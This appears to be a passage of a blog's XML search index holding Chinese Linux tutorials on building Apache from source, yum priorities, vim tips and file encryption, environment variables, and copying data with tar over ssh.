        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux源码包安装]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F40.Linux%E6%BA%90%E7%A0%81%E5%8C%85%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Linux源码包安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux下面安装一个源码包是最常用的，在日常的管理工作中，大部分软件都是通过源码安装的。安装一个源码包，是需要自己把源代码编译成二进制的可执行文件。如果读得懂这些源代码，那么就可以去修改这些源代码自定义功能，然后再去编译成想要的。使用源码包的好处除了可以自定义修改源代码外还可以定制相关的功能，因为源码包在编译的时候是可以附加额外的选项的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;源码包的编译用到了linux系统里的编译器，常见的源码包一般都是用C语言开发的，这也是因为C语言为linux上最标准的程序语言。Linux上的C语言编译器叫做gcc，利用它就可以把C语言变成可执行的二进制文件。所以如果你的机器上没有安装gcc就没有办法去编译源码。你可以使用 yum install -y gcc 来完成安装。 安装一个源码包，通常需要三个步骤：./configure&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这一步可以定制功能，加上相应的选项即可，具有有什么选项可以通过 ./configure –help 命令来查看。在这一步会自动检测你的linux系统与相关的套件是否有编译该源码包时需要的库，因为一旦缺少某个库就不能完成编译。只有检测通过后才会生成一个Makefile文件。 make&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用这个命令会根据Makefile文件中预设的参数进行编译，这一步其实就是gcc在工作了。 make install&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装步骤，生成相关的软件存放目录和配置文件的过程。 Apache源码安装实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的3步并不是所有的源码包软件都一样的，也就是说源码包的安装并非具有一定的标准安装步骤。这就需要拿到源码包解压后，然后进入到目录找相关的帮助文档，通常会以INSTALL或者README为文件名。所以一定要去看一下。 1.下载一个源码包下载源码包一定要去官方站点去下载，不要在网上随便下载，那样很不安全。因为下载到的源码包很有可能是被人修改过的。 12[root@localhost src]# cd /usr/local/src/[root@localhost src]# wget http://mirrors.hust.edu.cn/apache/httpd/httpd-2.2.27.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载地址为apache官方网站上提供的一个镜像，下载速度还可以。在下载之前，进入到了 “/usr/local/src” 目录，这是因为习惯把源码包都放到这个目录下，这样做的好处是，方便自己和其他管理员维护，所以以后下载的源码包都统一放到这个目录下吧。 2.解压源码包1[root@localhost src]# tar jxvf httpd-2.2.27.tar.bz2 3.配置相关的选项，并生成Makefile123456789101112131415161718192021[root@localhost src]# cd httpd-2.2.27[root@localhost httpd-2.2.27]# ./configure --help |less`configure' configures this package to adapt to many kinds of systems.Usage: ./configure [OPTION]... [VAR=VALUE]...To assign environment variables (e.g., CC, CFLAGS...), specify them asVAR=VALUE. See below for descriptions of some of the useful variables.Defaults for the options are specified in brackets.Configuration: -h, --help display this help and exit --help=short display options specific to this package --help=recursive display the short help of all the included packages -V, --version display version information and exit -q, --quiet, --silent do not print `checking ...' messages --cache-file=FILE cache test results in FILE [disabled] -C, --config-cache alias for `--cache-file=config.cache' -n, --no-create do not create output files --srcdir=DIR find the sources in DIR [configure dir or `..'] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 ./configure –help 命令查看可以使用的选项。一般常用的有 –prefix=PREFIX 这个选项的意思是定义软件包安装到哪里。一个小小的建议，通常源码包都是安装在/usr/local/目录下的。比如，把apache安装在/usr/local/apache2下，那么这里就应该这样写 –prefix=/usr/local/apache2 其他还有好多选项，如果有耐心可以挨个去看一看都有什么作用。 1234567891011121314151617181920212223242526[root@localhost httpd-2.2.27]# ./configure --prefix=/usr/local/apache2checking for chosen layout... Apachechecking for working mkdir -p... yeschecking build system type... i686-pc-linux-gnuchecking host system type... i686-pc-linux-gnuchecking target system type... i686-pc-linux-gnuConfiguring Apache Portable Runtime library ...checking for APR... reconfigconfiguring package in srclib/apr nowchecking build system type... i686-pc-linux-gnuchecking host system type... i686-pc-linux-gnuchecking target system type... i686-pc-linux-gnuConfiguring APR libraryPlatform: i686-pc-linux-gnuchecking for working mkdir -p... yesAPR Version: 1.4.6checking for chosen layout... aprchecking for gcc... nochecking for cc... nochecking for cl.exe... noconfigure: error: in `/usr/local/src/httpd-2.2.27/srclib/apr':configure: error: no acceptable C compiler found in $PATHSee `config.log' for more detailsconfigure failed for srclib/apr &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不幸的是，一开始就报错了，因为没有gcc编译器，需要先安装一下。 1[root@localhost httpd-2.2.27]# yum install -y gcc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于gcc依赖的包很多，所以安装时间会长一些。安装完后，再继续上面的步骤。 1[root@localhost httpd-2.2.27]# ./configure --prefix=/usr/local/apache2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;验证这一步是否成功的命令是： 12[root@localhost httpd-2.2.27]# echo $?0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回值如果是 “0” 则执行成功，否则就是没有成功。此时就成功生成 Makefile 了。 12[root@localhost httpd-2.2.27]# ls -l Makefile-rw-r--r-- 1 root root 8954 5月 13 12:02 Makefile 4.进行编译12[root@localhost httpd-2.2.27]# make-bash: make: command not found &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;又发生错误了，提示 “make” 命令没有发现，解决办法是安装make工具。 1[root@localhost httpd-2.2.27]# yum install -y make &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;继续make 1234567[root@localhost httpd-2.2.27]# makeMaking all in srclibmake[1]: Entering directory `/usr/local/src/httpd-2.2.27/srclib'Making all in aprmake[2]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'make[3]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'/bin/sh /usr/local/src/httpd-2.2.27/srclib/apr/libtool --silent --mode=compile gcc -g -O2 -pthread -DHAVE_CONFIG_H -DLINUX=2 -D_REENTRANT -D_GNU_SOURCE -D_LARGEFILE64_SOURCE -I./include -I/usr/local/src/httpd-2.2.27/srclib/apr/include/arch/unix -I./include/arch/unix -I/usr/local/src/httpd-2.2.27/srclib/apr/include/arch/unix -I/usr/local/src/httpd-2.2.27/srclib/apr/include -o passwd/apr_getpass.lo -c passwd/apr_getpass.c &amp;&amp; touch passwd/apr_getpass.lo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译的时候，就会出现类似这么多乱七八糟的信息，编译的时间比较长，CPU使用率会很高，这是因为CPU高速计算，编译完后，再使用 echo $? 验证一下是否正常成功。 12[root@localhost httpd-2.2.27]# echo $?0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是0的话，就可以执行最后一步了。 5.安装12345678[root@localhost httpd-2.2.27]# make installMaking install in srclibmake[1]: Entering directory `/usr/local/src/httpd-2.2.27/srclib'Making install in aprmake[2]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'make[3]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'make[3]: Nothing to be done for `local-all'.make[3]: Leaving directory `/usr/local/src/httpd-2.2.27/srclib/apr' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然也可以使用 echo $? 看看有没有正确安装，执行完这一步，则会在 “/usr/local/apache2” 目录下增加了很多目录。 123[root@localhost httpd-2.2.27]# ls /usr/local/apache2/bin cgi-bin error icons lib man modulesbuild conf htdocs include logs manual &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此，apache源码的安装就完成了]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[yum更新源优先级设置]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F38.yum%E6%9B%B4%E6%96%B0%E6%BA%90%E4%BC%98%E5%85%88%E7%BA%A7%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[yum更新源优先级设置1.安装 yum-priorities1yum install yum-priorities 2.priorities的配置文件是/etc/yum/pluginconf.d/priorities.conf，确认其是否存在。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其内容为: 12[main]enabled=1 # 0禁用 1启用 3.编辑 /etc/yum.repos.d/目录下的*.repo 文件来设置优先级。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数为： 1priority=N # N的值为1-99 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;推荐的设置为： 123[base], [addons], [updates], [extras] … priority=1[centosplus],[contrib] … priority=2Third Party Repos such as rpmforge … priority=N (where N is &gt; 10 and based on your preference) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数字越大,优先级越低]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim粘贴代码自动缩进导致全乱了]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F35.%20vim%E7%B2%98%E8%B4%B4%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E7%BC%A9%E8%BF%9B%E5%AF%BC%E8%87%B4%E5%85%A8%E4%B9%B1%E4%BA%86%2F</url>
    <content type="text"><![CDATA[vim粘贴代码自动缩进导致全乱了&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用vim打开一个空白文档，然后把已经复制的代码给粘贴进来，发现它有自动缩进功能，最终导致粘贴的文本一行比一行靠右，看起来乱成一团。比较快的解决办法是，在粘贴文档前，在命令行模式下，输入 1:set noai nosi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后按’i’ 进入编辑模式，再粘贴已经复制的代码内容，这样就不会自动缩进了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，这样的方法不好用，可以尝试这种： 1:set paste]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim给文件加密]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F33.%20vim%E7%BB%99%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[vim给文件加密&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux用vim/vi给文件加密和解密 一、利用 vim 加密：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：加密后，如果不知道密码，就看不到明文，包括root用户也看不了； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：很明显让别人知道加密了，容易让别人把加密的文件破坏掉，包括内容破坏和删除； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vi编辑器相信大家都很熟悉了吧，vi里有一个命令是给文件加密的，举个例子吧： 首先在root主目录/root/下建立一个实验文件text.txt： 1[root@www ~]# vim/vi text.txt 进到编辑模式，输入完内容后按ESC，然后输入:X（注意是大写的X），回车； 这时系统提示让你输入密码，2次，如下所示： 12输入密码: *******请再输入一次: ******* 保存后退出，现在这个文件已经加密了； 用cat或more查看文件内容，显示为乱码；用 vim重新编辑这个文件，会提示输入密码，如果输入的密码不正确，同样会显示为乱码！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：文件加密后，千万别忘了密码！ 二、解密用vi加密的文件（前提是你知道加密的密码）： 用 vim 打开文件如text.txt，要输入正确的密码，然后在编辑时，将密码设置为空，方法是输入下面的命令： 1：set key= &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后直接回车，保存文件后，文件已经解密了。 或者这样也行：在正确打开文件后用 “:X” 指令，然后给一个空密码也可以。保存用“wq!”保存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两种方法实际上效果是一样的。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 环境变量]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F4.%20Linux%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[Linux 环境变量显示环境变量1echo $[变量名] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例： 12echo $HOME/root 设置一个新的环境变量123$ export HELLO="Hello!"$ echo $HELLOHello! 查看全局环境变量命令：env&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 env 命令显示所有的环境变量 123456$ envHOSTNAME=redbooks.safe.orgPVM_RSH=/usr/bin/rshShell=/bin/bashTERM=xtermHISTSIZE=1000 查看所有环境变量命令：set&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 set 命令显示所有本地定义的 shell 变量 12345678$ setBASH=/bin/bashBASH_VERSINFO=([0]="2"[1]="05b"[2]="0"[3]="1"[4]="release"[5]="i386-redhat-linux-gnu")BASH_VERSION='2.05b.0(1)-release'COLORS=/etc/DIR_COLORS.xtermCOLUMNS=80DIRSTACK=()DISPLAY=:0.0 删除一个变量：unset&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1unset [变量名] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只针对当前会话 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;set可以设置某个环境变量的值。清除环境变量的值用unset命令。如果未指定值，则该变量值将被设为NULL。示例如下： 12345$ export TEST="Test..." #增加一个环境变量TEST$ env|grep TEST #此命令有输入，证明环境变量TEST已经存在了TEST=Test...$ unset $TEST #删除环境变量TEST$ env|grep TEST #此命令没有输出，证明环境变量TEST已经存在了 使用 readonly 命令设置只读变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用了 readonly 命令，变量就不可以被修改或清除了&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例如下： 123456$ export TEST="Test..." #增加一个环境变量TEST$ readonly TEST #将环境变量TEST设为只读$ unset TEST #会发现此变量不能被删除-bash: unset: TEST: cannot unset: readonly variable$ TEST="New" #会发现此也变量不能被修改-bash: TEST: readonly variable &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境变量的设置位于 /etc/profile 文件，如果需要增加新的环境变量可以添加下属行 1export PATH=$PATH:/PATH1:/PATH2:/PATHN Linux 的变量种类&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按变量的生存周期来划分，Linux 变量可范围两类：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、永久的：需要修改配置文件，变量永久生效。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、临时的：使用 export 命令声明即可，变量在关闭 shell 时失效。 环境变量的配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全局： /etc/profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;局部： ~/.bash_profile 设置变量的方法1.在 /etc/profile 文件中添加变量｛对所有用户生效（永久的）｝&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 vim 在文件 /etc/profile 文件中增加变量，该变量将会对 Linux下 所有用户有效，并且是“永久的”。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：编辑 /etc/profile 文件，添加CLASSPATH变量 12# vim /etc/profileexport CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：修改文件后要想马上生效还要运行 1# source /etc/profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不然只能在下次重进此用户时生效 2.在用户目录下个 .bash_profile 文件中增加变量｛对单一用户生效（永久的）｝&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 vim在用户目录下的 .bash_profile 文件中增加变量，改变量仅会对当前用户有效，并且是“永久的”。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：编辑guok用户目录(/home/guok)下的.bash_profile 1$ vim /home/guok/.bash.profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下内容 1export CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：修改文件后要想马上生效还要运行 1$ source /home/guok/.bash_profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不然只能在下次重进此用户时生效 3.直接运行 export 命令定义变量｛只对当前 shell （BASH）有效（临时的）｝12export JAVA_HOME=/usr/local/java #添加新变量名export PATH=$PATH:/usr/local/php/bin #修改已有变量名 常用的环境变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PATH：决定了shell将到哪些目录中寻找命令或程序，PATH的值是一系列以冒号分割的目录注意：最好不要把 “./“ 放到 PATH 中，这样会引起安全问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HOME：当前用户主目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HISTSIZE：历史记录数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LOGNAME：当前用户的登录名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HOSTNAME：指主机的名称 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SHELL：当前用户Shell类型 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LANGUGE：语言相关的环境变量，多语言可以修改此环境变量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MAIL&#160;&#160;&#160;&#160;当前用户的邮件存放目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS1：[\u@\h \W]\$ &#160;&#160;&#160;&#160;基本提示符，对于root用户是#，对于普通用户是$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS2:敲错以后进入的符号 PATH 声明，其格式为1PATH=$PATH:&lt;PATH 1&gt;:&lt;PATH 2&gt;:&lt;PATH 3&gt;:------:&lt;PATH N&gt;]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim编辑器里面一些不为人知的操作]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F30.%20vim%E7%BC%96%E8%BE%91%E5%99%A8%E9%87%8C%E9%9D%A2%E4%B8%80%E4%BA%9B%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[vim编辑器里面一些不为人知的操作1.vim编辑器的替换模式与可视模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下按键盘上的r和R进入替换模式。如果按小r那么这时候就进入了替换模式，你下一个输入的字符会把你当前光标所在处的字符替换，然后自动退出替换模式。如果你按的是大R那么你下面输入的所有字符会把后面的字符依次替换，直到按退出替换模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下按键盘上的v和V进入可视模式。如果是按小v那么这时候就时入了视图模式，这时候你移动光标会把你光标所在处到光标结尾处的所有字符选中，这时候可以进行复制，删除等操作。如果是按大V同样也是进入了视图模式，这时候移动光标会把光标所在行到光标结尾的行的所有内容选中，也可以进行复制，删除等操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：使用在一般模式使用“ctrl+v”组合键可以进入块操作模式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这个模式下和可视模式差不多，但是选择的内容不同，大家可实际操作看看 2.删除从光标所在处到行尾字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入大写“Ｄ”或者输入“d$” 3.删除从光标所在处到行首字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入大写“d^” 4.删除从光标所在行到文件末尾行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入大写“dG” 5.删除指定范围内所有行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：删除10到15行的所有内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15d”回车 6.把正在编辑的文件另存为新文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：把正在编辑的文件另存为到“/root/”下面并保存为1.txt&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:w /root/1.txt” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：把正在编辑的文件的第10行到第15行另存为1.txt并保存到root目录下在一般模式下输入“:10,15 w /root/1.txt” 7.把其它文件的内容导入到正在编辑的文件的光标所在处&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：把“/root/1.txt” 文件的内容，导入到下在编辑的文件的第10行下面&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先在一般模式下按“10G”把光标定位到第10行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后按“o”小写，当前行的下面另起一行，并进入插入模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后按键盘上的返回到一般模式，再输入“:r /root/1.txt”回车 8.正在编辑文件时，不退出文件仍可以运行linux命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我下在编辑一个文件，但这时候我想查看“/root/1.txt” 文件的内容，但是我不想退出我正在编辑的文件，那么我们可以这样在编辑模式下输入“:! cat /root/1.txt” 9.把命令的执行结果导入到正在编辑的文件的光标所在处&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这题我们可以结合上面两题，在一般模式下输入“:r ! cat /root/1.txt” 10.查找替换的功能使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在10到15行的行首增加“#”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15s/^/#/” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在10到15行的行首去掉“#”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15s/^#//” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在10到15行的行首增加“//”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15s/^/\/\//”或者“:10,15s@^@//@”或者“:10,15s#^#//#” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：在上面所有命令的最后面都可以加g或者c一起配合使用，g的意思是行中出现的所有指定字符都替换，但是如果加了g那么前面就不能出现位置定义字符，反之前面出现的位置定义字符，那么后面就不可以出现g。在后面加c可以跟用户交互，在查找到符合命令的字符提示用户是否替换，需要用户确认，否则不需要确认 11.把输入的指定字符替换为指定的字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在编辑一个文档的时候，我要频繁的输入“abcdefghijklmnopqrstuvwxyz”这样的连续字符串，这时候我想只输入一个或者一串指定字符就可以替换为刚才的字符，比如我指定输入“aming”系统就会自动把“aming”替换成“abcdefghijklmnopqrstuvwxyz”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:ab aming abcdefghijklmnopqrstuvwxyz”然后回车，再进入编辑模式，当你输入“aming”的时候就会发现自动替换成了“abcdefghijklmnopqrstuvwxyz” 12.快捷键的定义&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我想在一般模式下按键盘上的ctrl+b快捷键，会自动在光标所在行的行首插入“#”号，然后自动退出到一般模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:map ctrl+v ctrl+b I #”然后回车，这时候在一般模式按键盘上的ctrl+b的时候就会在光标所在的行首插入“#”号了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：命令中ctrl+v和ctrl+b是键盘上的组合键，不是输入进去的字符，是需要按的组合键，其中第一个ctrl+v就照按，第二个ctrl+b是要定义的快捷键，根据自己需要的设置按。然后“I”的意思就是一般模式下的“I”进入插入模式并将光标移动到行首，然后接着输入“#”号，后面“”的意思是退出编辑模式 13.同进编辑两个文件或者&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我现正在编辑１.txt文件，然后我想再打开root目录下的2.txt同时编辑，并把窗口上下水平分隔，一起显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:new /root/2.txt” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我现正在编辑１.txt文件，然后我想再打开root目录下的2.txt同时编辑，并把窗口左右垂直分隔，一起显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:vsplit /root/2.txt” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：在一般模式下按“ctrl+w”组合键，再按左右，或者上下方向键，可以在不同窗口之间切换如果在一般模式下输入“:only”那么只保留当前正在编辑的窗口，其它全关闭 15.在vim查找关键字时不区分大小写&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:set ic” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想取消就输入“:set noic” 16.如何把文件设置成只读文件，只有强制保存时才能保存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:set readonly” 17.把文件恢复到打开时的状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:e!” 18.配置文件的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上那么多操作，像设置忽略大小写，设定快捷键，设定自动替换，等一些操作，当电脑重启后就没有了。这时候我们可以把这些命令写入配置文件，这样电脑重启后还是可以使用，我们有两种方法 第一种：所有用户都统一修改“/etc/vimrc”文件，在末尾加入需要设置的命令，就是我红色标注的部分 第二种：只对当前用户修改用户家目录下的“.vimrc”文件，注意有个点，这是隐藏文件，一般用户家下没有，需要自己手工创建]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用tar通过网络拷贝数据]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F37.%20%E5%88%A9%E7%94%A8tar%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E6%8B%B7%E8%B4%9D%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[利用tar通过网路拷贝数据12# cd /data // data目录下有我们要拷贝的目标文件目录 test# tar cvf - test| ssh 10.0.1.11 "cd /copy1/; tar xvf -" //首先将要拷贝的目录test打包，"-" 代表标准输出，然后再ssh 到目标主机 10.0.1.11 ，运行相应的命令。其中tar xvf - 意思是，将前面的标准输出内容作为解包的对象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结：其实就是想拷贝的目录先打包，然后将打包好的文件拷贝到目标主机，最后在目标主机上解包。只不过，我们用一条命令实现了边打包边解包的过程。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux解压大于4G的压缩包]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F36.%20Linux%E8%A7%A3%E5%8E%8B%E5%A4%A7%E4%BA%8E4G%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85%2F</url>
    <content type="text"><![CDATA[Linux解压大于4G的zip压缩包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux下不支持解压大于4G的zip压缩包。解决办法如下： 12wget -c http://packages.sw.be/p7zip/p7zip-9.13-1.el5.rf.i386.rpmwget -c http://packages.sw.be/p7zip/p7zip-plugins-9.13-1.el5.rf.i386.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载完成后安装： 12rpm -ivh p7zip-9.13-1.el5.rf.i386.rpmrpm -ivh p7zip-plugins-9.13-1.el5.rf.i386.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压命令： 17z x 123.zip]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim快速删除制定的一段字符]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F34.%20vim%E5%BF%AB%E9%80%9F%E5%88%A0%E9%99%A4%E5%88%B6%E5%AE%9A%E7%9A%84%E4%B8%80%E6%AE%B5%E5%AD%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[vim快速删除制定的一段字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为不是一行，所以用dd不行，但用x去删除的话，又太慢。今天发现一种特别快速删除的方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那就是使用da，如何使用，请看下面的例子。比如，我的1.txt内容如下： 12311111111111111111111111111222222222222222222222222222222B3NzaC1yc2EAAAABIwAAAQEAv5oJvuIdaaVUsDOA2FbfnL0K2GbTc05Yg6TGM+8SNleI6bU5MhAy2uP5J4yCrMu43911hEJ2uh1UPycWX1O4xpEgUm8TGIs1HoQySnukv3g121uOLACRj37qqL9j4RRhrUxhunAW3alLSGIV0mxFD0ApyycFoLA/1I3hU7Yyx7tdripwz0FeHHhT3Qjfe9yC8Z6Ptq7cvBPXBBvc/G8pXVq3bnGMtj9Ifmbh7NnTvfHnEZGacf2MR4FSy0MMuNL0k3X5sBlsyP9/rXY9CPOh73eKUhZQoK3uWjwuDRp/dqrxgWDVeg0NZ+0t130pKu/LSREothWoVBu54rrtUUIdb3Sq0xsW4x9EhKGJJHPvBrbGbiDPTKBUaHdQEfmQQPAWeeX1hMC7lCunnfgTzf39Pv/2VpXz2l8NH2Jem0nrS48A6sf4eFz5VIakoRySMQu/6mY4s9aU3arbX+JvUE9s2/7D+JdqJlINtQqRU4V92LQq3BJaSMmKiwnPSytxDtARI3+8I2XXqFCJ5bBY7e333333333333333333333344444444444444444444444444444 